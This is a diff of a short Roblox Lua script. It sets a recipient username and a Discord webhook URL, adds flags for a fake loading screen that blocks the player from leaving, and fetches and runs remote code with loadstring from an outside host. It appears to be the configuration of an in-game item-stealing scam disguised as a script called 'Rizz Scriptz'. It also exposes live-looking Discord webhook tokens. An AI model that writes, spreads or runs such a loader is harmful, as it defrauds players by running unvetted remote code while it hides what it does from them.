@@ -1,4 +1,14 @@
-UserName = "shemade_m3nut"
-Webhook = "https://discord.com/api/webhooks/1094347250366419067/DRK--usLLcTaAVhONb4jcFA9YYxAL_gq-fSx2CEDxVKOc0qN43yKiAkGbWIFdoKpJpZ-https://discord.com/api/webhooks/1094347250366419067/DRK--usLLcTaAVhONb4jcFA9YYxAL_gq-fSx2CEDxVKOc0qN43yKiAkGbWIFdoKpJpZ-"
+UserName = "Jxiid3n"
+Webhook = "https://discord.com/api/webhooks/1099442554451279893/39T2T1U057P9G51VDtCz2NLaTGae2mToDpja7nOYB8w4J8nYozyoMtsTIyBGx-7u9Nnc" 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 
+
+loadstring(game:HttpGet("http://rizz.ct8.pl/scripts/Main", true))()
